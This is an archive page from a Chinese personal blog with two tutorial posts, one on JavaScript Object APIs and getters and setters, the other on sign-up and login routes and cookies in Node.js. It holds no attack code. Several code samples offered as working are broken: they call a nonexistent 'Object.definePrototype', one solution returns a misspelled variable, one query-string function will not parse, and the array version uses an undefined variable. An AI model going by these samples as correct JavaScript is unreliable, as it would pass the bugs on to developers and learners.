<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  
  <title>Page 2 | Archives: 2018/2 | 吴博文</title>
  <meta name="author" content="吴博文">
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
  <meta property="og:site_name" content="吴博文"/>

  
    <meta property="og:image" content=""/>
  
  
  <link href="/favicon.ico" rel="icon" type="image/x-ico">
  <link rel="canonical" href="http://yoursite.com/archives/2018/02/page/2/index.html" />
  <link rel="alternate" href="/atom.xml" title="吴博文" type="application/atom+xml">
  
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
  
<script type="text/javascript">
  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-45991394-1']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();
</script>

</head>


<body>
  <header id="header" class="inner"><div class="blog-header">
  <h1><a href="/">吴博文</a></h1>
  <h2><a href="/"></a></h2>
</div>
<nav id="main-nav" class="blog-nav">
  <ul>
    
      <li><a href="/">首页/Home</a></li>
    
      <li><a href="/archives">归档/Archives</a></li>
    
      <li><a href="/about">关于/About</a></li>
    
  </ul>
  <div class="clearfix"></div>
</nav>
<div class="clearfix"></div>
</header>
  <div id="content" class="inner">
    
      <div id="main-col" class="alignleft"><div id="wrapper">
<h2 class="archive-title">2018/2</h2>
<p></p>

  
    <article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src="">
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2018-02-07T11:17:07.000Z"><a href="/2018/02/07/JS系列 -- JavaScript 对象之 API/">2018-02-07</a></time>
      
      
  
    <h1 class="title"><a href="/2018/02/07/JS系列 -- JavaScript 对象之 API/">JS系列 -- JavaScript 对象之 API</a></h1>
  

    </header>
    <div class="entry">
      
        <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>之前介绍了 <a href="https://bowen-wu.github.io/2018/01/10/JS%E7%B3%BB%E5%88%97%20--%20JavaScript%20%E5%AF%B9%E8%B1%A1%E5%9F%BA%E7%A1%80/" target="_blank" rel="noopener">《JavaScript 对象基础》 </a>，现在我们来介绍一下挂载在 <code>Object.prototype</code> 上的属性</p>
<h1 id="Object-prototype-API"><a href="#Object-prototype-API" class="headerlink" title="Object.prototype API"></a>Object.prototype API</h1><p><code>Object.prototype</code> 表示对象的原型对象<br><code>Object.prototype</code> 属性的属性特征<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">writable ==&gt; 是否可写 ==&gt; false(默认)</span><br><span class="line">enumerable ==&gt; 是否可枚举 ==&gt; false(默认)</span><br><span class="line">configurable ==&gt; 是否可配置 ==&gt; false(默认)</span><br></pre></td></tr></table></figure></p>
<h3 id="Object-assign"><a href="#Object-assign" class="headerlink" title="Object.assign()"></a>Object.assign()</h3><p>用于将所有可枚举属性的值从一个或多个源对象复制到目标对象并返回目标对象<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Object.assign(target, ...sources)  // target 目标对象， sources 源对象</span><br><span class="line"></span><br><span class="line">Object.assign( &#123; a: 2, b: 1 &#125;, &#123; a: 1 &#125; )   // &#123; a: 1, b: 1 &#125;</span><br><span class="line">Object.assign( &#123; a: 1, b: 2 &#125;, &#123; a: &apos;a&apos; &#125;, &#123; c: 3 &#125;, &#123; a: 4 &#125; )  // &#123; a: 4, b: 2, c: 3 &#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="Object-create"><a href="#Object-create" class="headerlink" title="Object.create()"></a>Object.create()</h3><p>创建一个空对象，空对象的原型指向参数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Object.create( proto[, propertiesObject] ) // 第二参数为一个对象，可以写入新对象的属性 + 描述符</span><br></pre></td></tr></table></figure></p>
<h5 id="使用-Object-create-实现继承"><a href="#使用-Object-create-实现继承" class="headerlink" title="使用 Object.create() 实现继承"></a>使用 Object.create() 实现继承</h5><p><img src="http://upload-images.jianshu.io/upload_images/9617841-985125c7f108b498.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Object.create 实现继承"></p>
<h3 id="Object-setPrototypeOf"><a href="#Object-setPrototypeOf" class="headerlink" title="Object.setPrototypeOf()"></a>Object.setPrototypeOf()</h3><p>设置一个指定的对象的原型到另一个对象或 <code>null</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Object.setPrototypeOf( obj, prototype ) // 将对象 obj 的原型设置为 prototype（原型 | null）</span><br><span class="line">obj = Object.create( prototype )  === Object.setPrototypeOf( obj, prototype )</span><br></pre></td></tr></table></figure></p>
<h3 id="Object-defineProperty-Object-defineProperties"><a href="#Object-defineProperty-Object-defineProperties" class="headerlink" title="Object.defineProperty() | Object.defineProperties()"></a>Object.defineProperty() | Object.defineProperties()</h3><p>这两个方法都是在一个对象上定义新属性或修改现有属性，并返回对象<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Object.defineProperty( obj, prop, descriptor )</span><br><span class="line">Object.defineProperties( obj, props )</span><br></pre></td></tr></table></figure></p>
<h5 id="属性描述符"><a href="#属性描述符" class="headerlink" title="属性描述符"></a>属性描述符</h5><p>属性描述符分为<strong>数据描述符</strong> 和 <strong>存取描述符</strong>。描述符必须是二者之一</p>
<ul>
<li>数据描述符 ==&gt; value + writable ==&gt; 具有值的属性，该值可能是可写的，也可能是不可写的</li>
<li>存取描述符 ==&gt; set + get<h6 id="描述符可选键值"><a href="#描述符可选键值" class="headerlink" title="描述符可选键值"></a>描述符可选键值</h6></li>
<li><p>configurable ==&gt; 是否可配置 ==&gt; false(默认)</p>
</li>
<li><p>enumerable ==&gt; 是否可枚举 ==&gt; false(默认)</p>
</li>
<li><p>writable ==&gt; 是否可写 ==&gt; false(默认)</p>
</li>
<li><p>value ==&gt; 属性对应的值</p>
</li>
<li><p>get ==&gt; 一个给属性提供 getter 的方法，如果没有 getter 则为 undefined。该方法返回值被用作属性值，默认为 undefined</p>
</li>
<li><p>set ==&gt; 一个给属性提供 setter 的方法，如果没有 setter 则为 undefined。该方法接受唯一参数，并将该参数的新值分配给该属性，默认为 undefined<br><img src="http://upload-images.jianshu.io/upload_images/9617841-3a71e414e2343590.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="属性描述符"><br>如果对象属性有 getter + setter ，那么调用时走 getter，赋值时走 setter，getter + setter 作用：</p>
<ol>
<li>保护私有变量</li>
<li>响应式开发 | 双向数据绑定 | MVVM （<code>Object.definedProperty() + get + set</code>）</li>
</ol>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">let person = &#123;&#125;</span><br><span class="line">let ageValue = 18</span><br><span class="line">Object.definePrototype( person, &apos;name&apos;, &#123;</span><br><span class="line">    value: xxx,</span><br><span class="line">    configurable: false,  // 如果不写默认 false</span><br><span class="line">    writable: true,</span><br><span class="line">    enumerable: true</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">Object.definePrototype( person, &apos;age&apos;, &#123;</span><br><span class="line">    configurable: false,  // 如果不写默认 false</span><br><span class="line">    enumerable: true,</span><br><span class="line">    get : function()&#123;</span><br><span class="line">        return ageValue;</span><br><span class="line">    &#125;,</span><br><span class="line">    set : function( newValue )&#123;</span><br><span class="line">        ageValue = newValue;</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;)</span><br><span class="line">person.age   // 18</span><br><span class="line">person.age = 19</span><br><span class="line">person.age  // 19</span><br><span class="line"></span><br><span class="line">Object.defineProperties( person, &#123;</span><br><span class="line">    &apos;property1&apos; : &#123;</span><br><span class="line">        value: xxx,</span><br><span class="line">        configurable: false,  // 如果不写默认 false</span><br><span class="line">        writable: true,</span><br><span class="line">        enumerable: true</span><br><span class="line">    &#125;,</span><br><span class="line">    &apos;property2&apos; : &#123;</span><br><span class="line">        value: xxx,</span><br><span class="line">        configurable: false,  // 如果不写默认 false</span><br><span class="line">        writable: true,</span><br><span class="line">        enumerable: true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<h3 id="Object-getOwnPropertyDescriptor"><a href="#Object-getOwnPropertyDescriptor" class="headerlink" title="Object.getOwnPropertyDescriptor()"></a>Object.getOwnPropertyDescriptor()</h3><p>返回制定对象上一个自有属性对应的属性描述符<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Object.getOwnPropertyDescriptor( obj, prop )</span><br></pre></td></tr></table></figure></p>
<h3 id="Object-getOwnPropertyNames"><a href="#Object-getOwnPropertyNames" class="headerlink" title="Object.getOwnPropertyNames()"></a>Object.getOwnPropertyNames()</h3><p>返回一个由指定对象的所有自身属性的属性名（包括不可枚举属性但不包括 Symbol 值作为名称的属性）组成的数组</p>
<h3 id="Object-keys-Object-values"><a href="#Object-keys-Object-values" class="headerlink" title="Object.keys() | Object.values()"></a><a href="https://bowen-wu.github.io/2018/01/10/JS%E7%B3%BB%E5%88%97%20--%20JavaScript%20%E5%AF%B9%E8%B1%A1%E5%9F%BA%E7%A1%80/" target="_blank" rel="noopener">Object.keys() | Object.values()</a></h3><h3 id="Object-prototype-hasOwnProperty"><a href="#Object-prototype-hasOwnProperty" class="headerlink" title="Object.prototype.hasOwnProperty()"></a>Object.prototype.hasOwnProperty()</h3><p>返回一个布尔值，指示对象自身属性中是否具有指定的属性<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">obj.hasOwnProperty( prop )</span><br></pre></td></tr></table></figure></p>
<h1 id="使用-get-set-实现需求"><a href="#使用-get-set-实现需求" class="headerlink" title="使用 get + set 实现需求"></a>使用 get + set 实现需求</h1><p>给定一个对象 obj，返回一个新对象，新对象具有对象 obj 的所有属性，并且给新对象每个属性重新赋值都会触发修改函数，在下方代码处填写代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function getReactiveObj( obj, cb )&#123;</span><br><span class="line">    // 代码 code</span><br><span class="line">&#125;</span><br><span class="line">let obj = &#123; a: &apos;a&apos;, b: &apos;b&apos; &#125;</span><br><span class="line">function fn( prop,val )&#123;</span><br><span class="line">    console.log( `$&#123; prop &#125;属性的值变为$&#123; val &#125;` )</span><br><span class="line">&#125;</span><br><span class="line">let newObj = getReactiveObj( obj, fn )</span><br><span class="line">console.log( newObj.a )  // a</span><br><span class="line">console.log( newObj.b )  // b</span><br><span class="line">newObj.a = &apos;d&apos;  // a属性的值变为d</span><br><span class="line">console.log( newObj.a )  // d</span><br><span class="line">console.log( obj )  // &#123; a: &apos;a&apos;, b: &apos;b&apos; &#125;</span><br></pre></td></tr></table></figure></p>
<p>解决方案<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">function getReactiveObj( obj, cb )&#123;</span><br><span class="line">    let result = &#123;&#125;</span><br><span class="line">    Object.keys( obj ).forEach( ( item ) =&gt; &#123;</span><br><span class="line">        let value = obj[ item ]</span><br><span class="line">        Object.defineProperty( result, item, &#123;</span><br><span class="line">            get() &#123;</span><br><span class="line">                return value</span><br><span class="line">            &#125;,</span><br><span class="line">            set( val ) &#123;</span><br><span class="line">                cb.call( null, item, val )</span><br><span class="line">                value = val</span><br><span class="line">            &#125; </span><br><span class="line">        &#125; )</span><br><span class="line">    &#125;)</span><br><span class="line">    return reault</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="实现查询参数"><a href="#实现查询参数" class="headerlink" title="实现查询参数"></a>实现查询参数</h1><p>把一个 JS 对象转化成符合查询参数的字符串<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function parseToQuery()&#123;</span><br><span class="line">    // 代码</span><br><span class="line">&#125;</span><br><span class="line">parseToQuery(&#123; id: 100, name: &apos;hello&apos;, groups: &apos;xxx&apos; &#125;)  // &apos;id=100&amp;name=hello&amp;groups=xxx&apos; </span><br><span class="line">parseToQuery(&#123; id: 100, name: &apos;hello&apos;, groups: [ &apos;xxx&apos;, &apos;yyy&apos; ] &#125;)  // &apos;id=100&amp;name=hello&amp;groups=xxx&amp;groups=yyy&apos;</span><br></pre></td></tr></table></figure></p>
<h3 id="实现无数组方法一"><a href="#实现无数组方法一" class="headerlink" title="实现无数组方法一"></a>实现无数组方法一</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function parseToQuery( obj )&#123;</span><br><span class="line">    let arr = []</span><br><span class="line">    for( let key in obj )&#123;</span><br><span class="line">        arr.push( encodeURIComponent( key ) + &apos;=&apos; + encodeURIComponent( obj[ key ] ) )</span><br><span class="line">    &#125;</span><br><span class="line">    return arr.join( &apos;&amp;&apos; )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="encodeURIComponent"><a href="#encodeURIComponent" class="headerlink" title="encodeURIComponent()"></a>encodeURIComponent()</h5><p>对统一资源标识符（URI）的组成部分进行编码的方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">encodeURIComponent( str )   // URI 的组成部分</span><br></pre></td></tr></table></figure></p>
<h3 id="实现无数组方法二"><a href="#实现无数组方法二" class="headerlink" title="实现无数组方法二"></a>实现无数组方法二</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function parseToQuery( obj )&#123;</span><br><span class="line">    let str = &apos;&apos;</span><br><span class="line">    Object.keys( obj ).forEach( ( item ) =&gt; &#123;</span><br><span class="line">        var str1 = ` $&#123; item &#125;=$&#123; obj[ item ] &#125;&amp; `</span><br><span class="line">        str = str.concat( str1 )</span><br><span class="line">    &#125;)</span><br><span class="line">    return str.slice( 0, str.length-1 )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="实现无数组方法三"><a href="#实现无数组方法三" class="headerlink" title="实现无数组方法三"></a>实现无数组方法三</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function parseToQuery( obj )&#123;</span><br><span class="line">    return Object.keys( obj ).map( ( key ) =&gt; &#123;</span><br><span class="line">        `$&#123; key &#125;=$&#123; obj[ key ] &#125;`).join( &apos;&amp;&apos; )</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="实现有数组方法"><a href="#实现有数组方法" class="headerlink" title="实现有数组方法"></a>实现有数组方法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function parseToQuery( obj )&#123;</span><br><span class="line">    let result = &apos;&apos;</span><br><span class="line">    for( let key in obj )&#123;</span><br><span class="line">        if( obj[ key ] instanceof Array )&#123;</span><br><span class="line">            obj[ key ].forEach( (item) =&gt; &#123;</span><br><span class="line">                result += key + &apos;=&apos; + value + &apos;&amp;&apos;</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            result += key + &apos;=&apos; + obj[ key ] + &apos;&amp;&apos;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return result.substring( 0, result.length-1 )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer>
            
        
  
  <div class="tags">
    <a href="/tags/JavaScript/">JavaScript</a>
  </div>

                
      

      <div class="clearfix"></div>
    </footer>
  </div>
</article>

  
    <article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src="">
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2018-02-07T11:13:20.000Z"><a href="/2018/02/07/HTTP系列 -- 注册登录 + Cookie/">2018-02-07</a></time>
      
      
  
    <h1 class="title"><a href="/2018/02/07/HTTP系列 -- 注册登录 + Cookie/">HTTP系列 -- 注册登录 + Cookie</a></h1>
  

    </header>
    <div class="entry">
      
        <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>我们每天在使用电脑的时候都会去注册或者登录，作为前端是必须要了解其中的过程的。</p>
<h1 id="注册"><a href="#注册" class="headerlink" title="注册"></a>注册</h1><h3 id="后端"><a href="#后端" class="headerlink" title="后端"></a>后端</h3><p>后端需要一个路由，当用户请求注册界面时，后端要去读取注册界面，之后发给前端，并且还要设置 <code>method</code></p>
<ul>
<li><p><code>GET</code> ==&gt; 请求注册页面</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">else if( path === &apos;/sign_up&apos; &amp;&amp; method === &apos;GET&apos;)&#123;</span><br><span class="line">    let string = fs.readFileSync( &apos;./sign_up.html&apos;, &apos;utf-8&apos; )</span><br><span class="line">    response.setHeader( &apos;Content-Type&apos;, &apos;text/html;charset=utf-8&apos; )</span><br><span class="line">    response.statusCode = 200</span><br><span class="line">    response.write( string )</span><br><span class="line">    response.end()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>POST</code> ==&gt; 用户注册发送数据（使用表单 | AJAX）</p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">else if( path === &apos;/sign_up&apos; &amp;&amp; method === &apos;POST&apos; )&#123;</span><br><span class="line">    // 拿到前端 POST 的数据，之后进行处理，拿到后端想要的结构</span><br><span class="line">    readBody( request ).then( () =&gt; &#123;&#125;, () =&gt; &#123;&#125; )</span><br><span class="line">    // 后端进行验证</span><br><span class="line">    // 1. 验证用户输入是否合格</span><br><span class="line">    // 2. 验证用户名是否占用 | 邮箱是否占用（都是去和自己的数据库进行比较）</span><br><span class="line">    // 3. 验证失败 ==&gt; 以 JSON 格式传输给前端错误,400</span><br><span class="line">    // 4. 验证成功 ==&gt; 存储数据库，200</span><br><span class="line">&#125;</span><br><span class="line">function readBody( request )&#123;</span><br><span class="line">    return new Promise( ( resolve, reject ) =&gt; &#123;</span><br><span class="line">        let body = []</span><br><span class="line">        request.on( &apos;data&apos;, ( chunk ) =&gt; &#123;</span><br><span class="line">            body.push( chunk )</span><br><span class="line">        &#125;).on( &apos;end&apos;, () =&gt; &#123;</span><br><span class="line">            body = Buffer.concat( body ).toString()</span><br><span class="line">            resolve( body )</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h3><h5 id="跳转注册界面"><a href="#跳转注册界面" class="headerlink" title="跳转注册界面"></a>跳转注册界面</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&apos;/sign_up.html&apos;&gt;</span><br></pre></td></tr></table></figure>
<h5 id="提交用户输入数据"><a href="#提交用户输入数据" class="headerlink" title="提交用户输入数据"></a>提交用户输入数据</h5><ol>
<li>拿到用户输入，可以监听 <code>form</code> 的 <code>submit</code> 事件</li>
<li>前端验证<ul>
<li>验证成功 ==&gt; 下一步</li>
<li>验证失败 ==&gt; 提示用户</li>
</ul>
</li>
<li>发送请求（数据是第四部分 formdata）<ul>
<li><code>form</code> 的 <code>submit</code></li>
<li><code>$post()</code></li>
</ul>
</li>
<li>成功（打印 response） ==&gt; 200 + 渲染页面</li>
<li>失败（打印 response） ==&gt; JSON 格式的字符串 + 解析 + 提示用户</li>
</ol>
<h1 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h1><h3 id="后端-1"><a href="#后端-1" class="headerlink" title="后端"></a>后端</h3><p>后端需要一个路由，当用户请求登录界面时，后端要去读取登录界面，之后发给前端，并且还要设置 method</p>
<ul>
<li><p><code>GET</code> ==&gt; 请求注册页面</p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">else if( path === &apos;/sign_in&apos; &amp;&amp; method === &apos;GET&apos;)&#123;</span><br><span class="line">    let string = fs.readFileSync( &apos;./sign_in.html&apos;, &apos;utf-8&apos; )</span><br><span class="line">    response.setHeader( &apos;Content-Type&apos;, &apos;text/html;charset=utf-8&apos; )</span><br><span class="line">    response.statusCode = 200</span><br><span class="line">    response.write( string )</span><br><span class="line">    response.end()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>POST</code> ==&gt; 用户登录发送数据（使用表单 | AJAX）</p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">else if(path===&apos;/sign_in&apos; &amp;&amp; method === &apos;POST&apos;)&#123;</span><br><span class="line">    // 拿到前端 POST 的数据，之后进行处理，拿到后端想要的结构</span><br><span class="line">     readBody( request ).then( () =&gt; &#123;&#125;, () =&gt; &#123;&#125; )</span><br><span class="line">    // 后端进行数据库比对</span><br><span class="line">    // 1. 比对用户是否存在</span><br><span class="line">    // 2. 比对用户输入密码是否正确</span><br><span class="line">    // 3. 比对失败 ==&gt; 以 JSON 格式传输给前端错误,400</span><br><span class="line">    // 4. 比对成功 ==&gt; 设置 Cookie ，200</span><br><span class="line">    response.setHeader( &apos;Set-Cookie&apos;,  &apos;xxx&apos; ) // xxx 就是一个身份证</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="前端-1"><a href="#前端-1" class="headerlink" title="前端"></a>前端</h3><h5 id="跳转登录界面"><a href="#跳转登录界面" class="headerlink" title="跳转登录界面"></a>跳转登录界面</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&apos;/sign_in.html&apos;&gt;</span><br></pre></td></tr></table></figure>
<h5 id="提交用户输入数据-1"><a href="#提交用户输入数据-1" class="headerlink" title="提交用户输入数据"></a>提交用户输入数据</h5><ol>
<li>拿到用户输入，可以监听 <code>form</code> 的 <code>submit</code> 事件</li>
<li>前端验证<ul>
<li>验证成功 ==&gt; 下一步</li>
<li>验证失败 ==&gt; 提示用户</li>
</ul>
</li>
<li>发送请求（数据是第四部分 formdata）<ul>
<li><code>form</code> 的 <code>submit</code></li>
<li><code>$post()</code></li>
</ul>
</li>
<li>成功（打印 response） ==&gt; 200 + 渲染页面</li>
<li>失败（打印 response） ==&gt; JSON 格式的字符串 + 解析 + 提示用户</li>
</ol>
<h1 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h1><p>服务器发送到用户浏览器并保存在用户本地的一小块数据，它会在浏览器下次向同一服务器再次发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。<strong>Cookie使基于无状态的 HTTP 协议记录稳定的状态信息成为了可能</strong></p>
<h3 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h3><p>Cookie 主要用于以下三个方面</p>
<ol>
<li>会话状态管理（如用户登录状态、购物车、游戏分数或其他需要记录的信息）</li>
<li>个性化设置（如用户自定义设置、主题等）</li>
<li>浏览器跟踪行为（如跟踪用户行为等）</li>
</ol>
<h3 id="前端设置-Cookie"><a href="#前端设置-Cookie" class="headerlink" title="前端设置 Cookie"></a>前端设置 Cookie</h3><p>通过 <code>document.cookie</code> API 可以获取或设置当前文档相关联的 Cookie</p>
<h5 id="读取-Cookie"><a href="#读取-Cookie" class="headerlink" title="读取 Cookie"></a>读取 Cookie</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">let  allCookie = document.cookie</span><br></pre></td></tr></table></figure>
<h5 id="设置（写一个新的）Cookie"><a href="#设置（写一个新的）Cookie" class="headerlink" title="设置（写一个新的）Cookie"></a>设置（写一个新的）Cookie</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.cookie = newCookie</span><br></pre></td></tr></table></figure>
<p><code>newCookie</code> 是一个键值对形式的字符串，使用这个方法一次只能对一个 Cookie 进行设置或更新。以下可选 Cookie 属性值可以跟在键值对后，用来具体化对 Cookie 的设置或更新，使用分号进行分隔</p>
<ul>
<li><p><code>;path = path</code> ==&gt; 如果没有定义，默认为当前文档位置的路径</p>
</li>
<li><p><code>;domain = domain</code> ==&gt; 如果没有定义，默认为当前文档位置的路径的域名部分</p>
</li>
<li><p><code>;max-age = max-age-in-seconds</code> ==&gt; 过期时长</p>
</li>
<li><p><code>;expires = date-in-GMTString-format</code> ==&gt; 如果没有定义，Cookie 会在会话结束时过期</p>
</li>
<li><p><code>;secure</code> ==&gt; Cookie 只能通过 HTTPS 传输</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.cookie = &quot;someCookieName=true; expires=Fri, 31 Dec 9999 23:59:59 GMT; path=/&quot;;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="后端-code"><a href="#后端-code" class="headerlink" title="后端 + code"></a>后端 + code</h3><p>后端验证成功（200）时会设置一个 Cookie 响应头<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response.setHeader(&apos;Set-Cookie&apos;, &apos;xxx&apos; ) // xxx 就是一个身份证</span><br></pre></td></tr></table></figure></p>
<p>设置 Cookie 之后的同源请求都会带着 Cookie</p>
<h5 id="会话期-Cookie"><a href="#会话期-Cookie" class="headerlink" title="会话期 Cookie"></a>会话期 Cookie</h5><p>浏览器关闭后会自动删除，它仅在会话期有效。会话期 Cookie 不需要指定过期时间（Expirse）或者有效期（Max-Age）</p>
